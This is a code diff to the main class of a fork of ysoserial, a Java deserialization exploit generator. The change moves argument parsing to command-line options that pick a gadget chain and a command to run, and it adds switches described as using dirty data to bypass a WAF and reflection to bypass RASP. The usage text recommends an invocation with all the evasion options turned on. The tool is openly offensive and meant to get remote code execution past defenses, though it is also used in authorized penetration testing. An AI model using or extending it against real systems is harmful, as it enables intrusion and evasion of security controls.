@@ -3,6 +3,7 @@ package org.su18.ysuserial;
 import java.io.PrintStream;
 import java.util.*;
 
+import org.apache.commons.cli.*;
 import org.su18.ysuserial.payloads.ObjectPayload;
 import org.su18.ysuserial.payloads.ObjectPayload.Utils;
 import org.su18.ysuserial.payloads.annotation.Authors;
@@ -11,7 +12,9 @@ import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;
 
 public class GeneratePayload {
 
-	public static Boolean IS_SHORT = true;
+	public static Boolean IS_OBSCURE = false;
+
+	public static CommandLine cmdLine;
 
 	public static Boolean IS_INHERIT_ABSTRACT_TRANSLET = false;
 
@@ -20,32 +23,58 @@ public class GeneratePayload {
 	private static final int USAGE_CODE = 64;
 
 	public static void main(final String[] args) {
-		if (args.length < 2) {
-			printUsage();
+
+		Options options = new Options();
+		options.addOption("g", "gadget", true, "Java deserialization gadget");
+		options.addOption("p", "parameters", true, "Gadget parameters");
+		options.addOption("d", "dirty", true, "Using dirty data to bypass WAF");
+		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
+		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not");
+
+		CommandLineParser parser = new DefaultParser();
+
+		if (args.length == 0) {
+			printUsage(options);
 			System.exit(USAGE_CODE);
 		}
-		final String payloadType = args[0];
-		final String command     = args[1];
+
+		try {
+			cmdLine = parser.parse(options, args);
+		} catch (Exception e) {
+			System.out.println("[*] Parameter input error, please use -h for more information");
+			printUsage(options);
+			System.exit(USAGE_CODE);
+		}
+
+		if (cmdLine.hasOption("inherit")) {
+			IS_INHERIT_ABSTRACT_TRANSLET = true;
+		}
+
+		if (cmdLine.hasOption("obscure")) {
+			IS_OBSCURE = true;
+		}
+
+		final String payloadType = cmdLine.getOptionValue("gadget");
+		final String command     = cmdLine.getOptionValue("parameters");
 
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
 			System.err.println("Invalid payload type '" + payloadType + "'");
-			printUsage();
+			printUsage(options);
 			System.exit(USAGE_CODE);
 			return;
 		}
 
 		try {
-			int length = 0;
-			// 如果加入长度混淆，证明目标对长度无限制，将 IS_SHORT 设置为 false
-			if (args.length >= 3) {
-				length = Integer.parseInt(args[2]);
-				IS_SHORT = false;
-			}
-
 			ObjectPayload payload = payloadClass.newInstance();
 			Object        object  = payload.getObject(command);
-			object = new DirtyDataWrapper(object, length).doWrap();
+
+			// 是否指定混淆
+			if (cmdLine.hasOption("dirty")) {
+				int length = Integer.parseInt(cmdLine.getOptionValue("dirty"));
+				object = new DirtyDataWrapper(object, length).doWrap();
+			}
+
 
 			PrintStream out = System.out;
 			Serializer.serialize(object, out);
@@ -58,7 +87,7 @@ public class GeneratePayload {
 		System.exit(0);
 	}
 
-	private static void printUsage() {
+	private static void printUsage(Options options) {
 
 		System.err.println("            _.-^^---....,,--\n" +
 				"       _--                  --_\n" +
@@ -77,7 +106,7 @@ public class GeneratePayload {
 		System.err.println("[root]#~  A Mind-Blowing Tool Collected By [ su18@javaweb.org ]");
 		System.err.println("[root]#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei");
 		System.err.println("[root]#~  AND OF COURSE TO THE All MIGHTY @frohoff  ");
-		System.err.println("[root]#~  Usage: java -jar ysoserial-0.7-su18-all.jar [payload] '[command]'");
+		System.err.println("[root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' [options]");
 		System.err.println("[root]#~  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
@@ -100,5 +129,13 @@ public class GeneratePayload {
 		for (String line : lines) {
 			System.err.println("     " + line);
 		}
+
+		System.err.println("\r\n");
+		new HelpFormatter().printHelp("ysoserial-[version]-su18-all.jar", options, true);
+		System.err.println("\r\n");
+		System.err.println("Recommended Usage: -g [payload] -p '[command]' -d 50000 -o -i");
+		System.err.println("If you want your payload being extremely short，you could just use:");
+		System.err.println("java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'");
+
 	}
 }
